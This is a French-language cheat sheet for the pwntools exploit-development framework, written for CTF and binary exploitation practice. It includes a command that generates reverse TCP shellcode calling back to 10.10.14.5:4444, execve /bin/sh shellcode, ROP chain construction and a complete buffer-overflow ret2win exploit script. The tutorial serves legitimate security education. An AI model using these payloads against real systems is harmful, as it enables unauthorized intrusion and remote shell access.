<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Aide-mémoire pwntools

[pwntools](https://github.com/Gallopsled/pwntools) est un framework CTF de premier ordre et une bibliothèque de développement d'exploits écrite en Python. Conçu pour le prototypage rapide, l'exploitation binaire (pwn) et l'ingénierie inverse, il fournit une suite complète d'outils de ligne de commande (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) ainsi qu'une API Python de haut niveau pour interagir avec les processus locaux et les sockets distants.

---

## Table des matières

- [Capacités de base](#core-capabilities)
- [Installation](#installation)
- [Utilitaires de ligne de commande (`pwn <cmd>`)](#command-line-utilities-pwn-cmd)
  - [`pwn cyclic` (Calcul du décalage du tampon)](#pwn-cyclic-buffer-offset-calculation)
  - [`pwn checksec` (Inspection d'atténuation)](#pwn-checksec-mitigation-inspection)
  - [`pwn asm` & `pwn disasm` (Assembleur/Désassembleur)](#pwn-asm--pwn-disasm-assembler--disassembler)
  - [`pwn shellcraft` (Générateur de Shellcode)](#pwn-shellcraft-shellcode-generator)
  - [`pwn template` (Générateur de squelette d'exploitation)](#pwn-template-exploit-skeleton-generator)
- [Workflow de développement d'exploits Python](#python-exploit-development-workflow)
  - [Connexions de processus et de socket distant](#process--remote-socket-connections)
  - [Analyse ELF et symboles](#elf-parsing--symboles)
  - [Construction de chaîne ROP](#rop-chain-construction)
  -[Emballage et endianité (`p32` / `p64`)](#packing--endianness-p32--p64)
- [Exemple d'exploitation complet (Buffer Overflow + ret2win)](#complete-exploit-example-buffer-overflow--ret2win)

---

## Capacités de base

- **Architecture Tubes :** Interface unifiée pour interagir avec les processus locaux (`process`), les sockets TCP distants (`remote`) et les sessions SSH (`ssh`).
- **Inspection binaire et gadget :** Résolution automatisée des symboles ELF, recherche GOT/PLT et synthèse automatisée de la chaîne ROP.
- **Assemblage à la volée :** Traduction instantanée entre les mnémoniques d'assemblage et les opcodes sur x86, x86_64, ARM, MIPS et AArch64.
- **Synthèse de shellcode :** Modèles de shellcode prédéfinis et personnalisables pour les shells inversés, l'exécution, la lecture de fichiers et l'évasion.

---

##Installation
```bash
# Ubuntu / Debian / Kali Linux
sudo apt-get update && sudo apt-get install -y python3-pwntools

# Via pip in an isolated Python environment
pip3 install pwntools

# Verify command-line utilities
pwn version
```
---

## Utilitaires de ligne de commande (`pwn <cmd>`)

### `pwn cyclic` (calcul du décalage du tampon)
Générez des modèles cycliques De Bruijn uniques pour déterminer le décalage exact du crash (écrasement EIP/RIP) :
```bash
# Generate a 200-byte unique pattern
pwn cyclic 200

# Find offset of crashing pattern (e.g. from crash address or register value 0x6161616c)
pwn cyclic -l 0x6161616c
# Output: 44 (offset is exactly 44 bytes to saved instruction pointer)

# 64-bit architecture cyclic pattern lookup
pwn cyclic -l "faaa" -n 8
```
### `pwn checksec` (Inspection d'atténuation)
Vérifiez les mesures d'atténuation de sécurité (Canary, NX, PIE, RELRO, ASLR) de tout exécutable ELF :
```bash
pwn checksec /path/to/binary
```
### `pwn asm` & `pwn disasm` (Assembleur/Démonteur)
Assemblez les instructions en octets de shellcode directement depuis le terminal :
```bash
# Assemble x86 instructions to hex bytes
pwn asm "xor eax, eax; push eax"

# Assemble 64-bit shellcode with null-byte output format
pwn asm -c amd64 "mov rax, 59; syscall" --format hex

# Disassemble raw hex bytes back to assembly
pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
```
### `pwn shellcraft` (Générateur de Shellcode)
Générez des charges utiles de shellcode prêtes pour la production directement sur la sortie standard du terminal ou dans des fichiers binaires :
```bash
# Generate Linux x64 execve /bin/sh shellcode in hex
pwn shellcraft amd64.linux.sh --format hex

# Generate reverse TCP shellcode (IP: 10.10.14.5, Port: 4444)
pwn shellcraft amd64.linux.connect 10.10.14.5 4444

# Output pure raw bytes directly into a file
pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
```
### `pwn template` (Exploiter le générateur de squelette)
Générez un modèle d'exploit Python testé au combat pour un binaire cible et un serveur distant :
```bash
pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
```
---

## Flux de travail de développement d'exploits Python

### Connexions de processus et de sockets distants
```python
from pwn import *

# Set target architecture and log level
context.arch = 'amd64'
context.log_level = 'debug'

# Local process execution
io = process('./vuln_binary')

# Or connect to remote CTF instance
# io = remote('10.10.10.100', 1337)

# Send and receive data
io.recvuntil(b'Enter your name: ')
io.sendline(b'Alice')

# Switch to interactive shell once exploit succeeds
io.interactive()
```
### Analyse ELF et symboles
Lisez automatiquement les adresses de fonction, les tables GOT et PLT sans recherche manuelle GDB :
```python
elf = ELF('./vuln_binary')
print(f"Target function address: {hex(elf.symbols['win'])}")
print(f"puts() PLT address: {hex(elf.plt['puts'])}")
print(f"puts() GOT address: {hex(elf.got['puts'])}")
```
### Construction de la chaîne ROP
Créez automatiquement des chaînes de programmation orientée retour (ROP) :
```python
elf = ELF('./vuln_binary')
rop = ROP(elf)

# Call win_function(0x1337, 0xdeadbeef)
rop.win(0x1337, 0xdeadbeef)
print(rop.dump())

payload = b"A" * 40 + rop.chain()
```
### Emballage et endianité (`p32` / `p64`)
Convertissez les adresses mémoire entières en octets petit-boutiste :
```python
# 32-bit little-endian packing
address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'

# 64-bit little-endian packing
address_64 = p64(0x0000000000401156)

# Unpacking bytes to integer
val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
```
---

## Exemple d'exploitation complet (débordement de tampon + ret2win)
```python
#!/usr/bin/env python3
from pwn import *

# Binary configuration
binary_path = './challenge'
context.binary = binary_path
context.log_level = 'info'

elf = ELF(binary_path)

# 1. Start target process or remote connection
if args.REMOTE:
    io = remote('target.ctf.local', 9999)
else:
    io = process(binary_path)

# 2. Craft payload
offset = 40
win_address = elf.symbols['win']

# Include ret gadget for 16-byte stack alignment in Ubuntu 64-bit
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    asm('nop') * offset,
    ret_gadget,
    win_address
)

# 3. Deliver payload
io.recvuntil(b'Say something: ')
io.sendline(payload)

# 4. Drop to interactive shell
log.success("Exploit sent! Enjoy your shell:")
io.interactive()
```